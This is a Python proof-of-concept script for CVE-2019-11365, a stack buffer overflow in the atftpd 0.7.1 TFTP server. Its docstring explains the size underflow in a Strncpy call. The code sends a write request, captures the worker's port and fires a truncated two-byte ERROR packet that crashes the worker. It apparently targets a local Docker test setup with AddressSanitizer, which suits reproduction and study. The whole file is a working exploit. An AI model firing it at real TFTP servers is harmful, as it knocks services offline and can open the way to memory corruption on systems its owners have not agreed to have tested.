#!/usr/bin/env python3
"""
PoC for CVE-2019-11365 - atftp 0.7.1 atftpd stack buffer overflow (CWE-787).

atftpd's file-transfer loop copies the message field of a client ERROR packet
with:

    Strncpy(string, tftphdr->th_msg,
            (((data_size - 4) > MAXLEN) ? MAXLEN : (data_size - 4)));

data_size is the UDP payload length of the ERROR packet.  A truncated ERROR
packet of <= 3 bytes makes (data_size - 4) negative; as a size_t that is a
huge value, so Strncpy overruns the fixed stack buffer `string`.

Flow used (WRQ / upload path -> tftpd_receive_file):
  1. Send a WRQ (opcode 0x02) "upload\\0octet\\0" to UDP 69.
  2. atftpd spawns a per-transfer worker on a NEW ephemeral source port and
     replies with ACK block 0 (opcode 0x04 0x00 0x00) from that port.
  3. We capture that worker source port and send a 2-byte ERROR packet
     b"\\x00\\x05" (opcode 5, truncated to 2 bytes) back to it.
  4. data_size == 2  ->  data_size - 4 == -2  ->  ~SIZE_MAX  ->  overflow.

Usage: poc_cve_2019_11365.py [host] [port]   (default 127.0.0.1 6901)
"""
import socket
import sys

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 6901

# --- TFTP opcodes ---
OP_WRQ = 0x02
OP_ERROR = 0x05

wrq = bytes([0x00, OP_WRQ]) + b"upload\x00octet\x00"
truncated_error = bytes([0x00, OP_ERROR])  # 2-byte ERROR -> data_size = 2 < 4

print(f"[*] Target atftpd at {host}:{port}/udp")

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(5)

print(f"[*] Step 1: sending WRQ (write request) for 'upload' ({len(wrq)} bytes)")
s.sendto(wrq, (host, port))

worker_addr = None
try:
    data, worker_addr = s.recvfrom(2048)
    print(f"[*] Step 2: worker replied from {worker_addr} -> {data!r}")
except socket.timeout:
    print("[!] No reply to WRQ. Falling back to original port for the ERROR shot.")

target = worker_addr if worker_addr else (host, port)
print(f"[*] Step 3: sending truncated 2-byte ERROR {truncated_error!r} to {target}")
s.sendto(truncated_error, target)

# Give the worker a moment; try to read any further reply (likely none on crash).
try:
    data, _ = s.recvfrom(2048)
    print(f"[*] Post-ERROR reply: {data!r}")
except socket.timeout:
    print("[*] No further reply (expected if the worker crashed).")

s.close()
print("[*] Done. Check `docker logs` for the ASan stack-buffer-overflow trace")
print("    naming tftpd_receive_file / Strncpy / tftpd_file.c.")
